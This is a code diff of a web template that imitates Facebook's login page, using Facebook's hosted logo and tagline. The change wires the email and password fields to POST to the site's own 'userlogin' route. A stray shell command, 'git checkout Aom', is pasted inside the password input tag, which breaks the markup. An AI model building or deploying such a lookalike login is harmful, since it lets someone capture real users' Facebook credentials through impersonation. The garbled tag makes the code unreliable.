@@ -12,14 +12,16 @@
     <div class="container flex">
         <div class="facebook-page flex">
             <div class="text">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="" >
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="">
                 <p>Facebook helps you connect and share</p>
                 <p>with the people in your life.</p>
             </div>
             <div class="fom">
-                <form action="#">
-                    <input type="email" placeholder="Email address or phone number" required>
-                    <input type="password" placeholder="Password" required class="pass">
+                <form action="{{ route('userlogin') }}" method="POST">
+                    @csrf
+                    <input type="email" name="email" placeholder="Email address or phone number" required>
+                    <input type="password" name="password" git checkout Aom
+                        placeholder="Password" required class="pass">
                     <div class="link">
                         <button type="submit" class="login">Log in</button>
                         <a href="#" class="forgot">Forgotten password?</a>
